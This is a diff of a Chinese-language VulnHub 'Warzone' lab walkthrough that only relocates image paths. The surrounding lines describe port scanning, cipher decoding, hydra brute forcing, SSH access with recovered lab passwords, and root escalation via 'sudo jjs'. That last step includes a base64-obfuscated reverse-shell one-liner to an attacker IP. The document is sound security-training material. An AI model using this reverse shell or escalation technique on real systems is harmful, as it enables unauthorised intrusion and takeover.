@@ -12,13 +12,13 @@
 
 使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`扫描
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\1.jpg)
+![](./pic-1/1.jpg)
 
 # 信息收集
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\2.jpg)
+![](./pic-1/2.jpg)
 
 ## FTP信息测试
 
@@ -26,7 +26,7 @@
 
 测试发现可以登录，并且有文件，尝试下载到`kali`中
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\3.jpg)
+![](./pic-1/3.jpg)
 
 查看文件，发现提示说，请使用这个`jar`文件加密密码，说明可能在某些时候，获取到的密码，需要通过这个文件加密后才能使用
 
@@ -42,15 +42,15 @@
 
 不过源代码中的注释，不知道是什么含义，组合在一起并非英文词语，可能是某种加密
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\5.jpg)
+![](./pic-1/5.jpg)
 
 对网站进行 目录爆破，发现`console`目录
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\6.jpg)
+![](./pic-1/6.jpg)
 
 访问`console`目录，发现需要输入`PIN`值，把前面收集到的信息进行测试，发现都不对
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\7.jpg)
+![](./pic-1/7.jpg)
 
 那还是处理一下那一串类似加密字符`GA DIE UHCEETASTTRNL`，网上搜了一下各种加密算法，最终发现栅栏密码符合这种提示，也就是通过这种表的形式，构成无规律的字符，并且其栏数，是根据其行数，也就是在加密过程是N个为一组，每一组根据其第一个字符后面接上同一行的字符，然后再接上后面的同样操作，构成的就是加密。
 
@@ -60,7 +60,7 @@
 
 使用网上的解密网站，发现大部分解密出的结果依然是不可读的形式，啧，这就不应该，算法应该就是栅栏加密，最终看了一下网上的`wp`，算法正确，栏数正确，就是网站问题，借助这个网站可以解密出`https://www.a.tools/Tool.php?Id=264`
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\8.jpg)
+![](./pic-1/8.jpg)
 
 解密出`GET AUTH CREDENTIALS`，但是把其作为`pin`访问`console`，还是不对，啧
 
@@ -76,7 +76,7 @@
 
 注意，这里大写访问是没有效果，还是需要转换为小写再访问`get/auth/credentials`
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\9.jpg)
+![](./pic-1/9.jpg)
 
 | username    | password                                     |
 | ----------- | -------------------------------------------- |
@@ -99,7 +99,7 @@
 
 可以先使用`jd-gui`分析代码构成，然后编写代码，这里我是直接在`encrypto`下的`main.class`编辑
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\10.jpg)
+![](./pic-1/10.jpg)
 
 在`windows`中使用`eclipse`等工具，然后编写，根据其使用的包，进行对应的解密代码
 
@@ -136,11 +136,11 @@ public class Main {
 }
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\11.jpg)
+![](./pic-1/11.jpg)
 
 不过这里如果已经知道其反编译后的信息后，可以不借助该插件，当然这里在`kali`中也是可以进行相关操作的，直接创建一个目录作为包，然后在目录下创建三个`java`文件，然后直接使用`java Main.java`即可
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\12.jpg)
+![](./pic-1/12.jpg)
 
 这是把所有的解密结果，整合起来，做成两个文件，然后使用`hydra`进行爆破
 
@@ -161,19 +161,19 @@ public class Main {
 
 发现一个用户名`commando`和密码`c0mmandosArentRea1.!`
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\13.jpg)
+![](./pic-1/13.jpg)
 
 使用`ssh`登录用户`commando`，并习惯性查看其目录的所有文件，发现`.bash_history`有内容的
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\14.jpg)
+![](./pic-1/14.jpg)
 
 发现一个文件的地址，以及一些脚本文件
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\15.jpg)
+![](./pic-1/15.jpg)
 
 确定为切换到`captain`目录下，然后其目录下的`Desktop`，那么查看`/home`目录，发现`captain`，进入该目录，发现`user.txt`无权访问，但是`.crypt`有访问权限的，进入该目录，发现四个文件`.c、readme.txt、encrypt.py、script.sh`
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\16.jpg)
+![](./pic-1/16.jpg)
 
 本来尝试在`kali`中执行下面代码的，不过应该这里的某个包是其自定义的，所以，还是在靶机环境下运行
 
@@ -190,21 +190,21 @@ print(fin)
 
 运行脚本后，出现原始密码`_us3rz0ne_F1RE`，不过这个密码测试发现是`captain`的
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\17.jpg)
+![](./pic-1/17.jpg)
 
 先去查看之前的`user.txt`
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\18.jpg)
+![](./pic-1/18.jpg)
 
 ## 垂直提权至root
 
 访问其用户目录下的`.bash_history`后，发现有东西，这个很像是`sudo`提权
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\19.jpg)
+![](./pic-1/19.jpg)
 
 使用`sudo -l`后，确定是，这里也是跟着步骤走，没想到直接就可以，都不用信息收集一下了
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\20.jpg)
+![](./pic-1/20.jpg)
 
 
 
@@ -214,7 +214,7 @@ print(fin)
 echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo jjs
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\21.jpg)
+![](./pic-1/21.jpg)
 
 不过上面的代码一用就卡死，所以稍微改动一下，使其新建一个shell，并反弹出去，因为这里的`exec`是执行命令的
 
@@ -226,11 +226,11 @@ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo
 echo "Java.type('java.lang.Runtime').getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTYvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}').waitFor()" | sudo jjs
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\22.jpg)
+![](./pic-1/22.jpg)
 
 查看`root.txt`，之前提示过，结构与`captain`相似，所以直接到`Desktop`目录可以看到
 
-![](D:\stu\vulnhub\warzone靶场\pic-1\23.jpg)
+![](./pic-1/23.jpg)
 
 然后还发现了加密后的密码，也可以在继续做下去，解密这个，与前面一样的
 
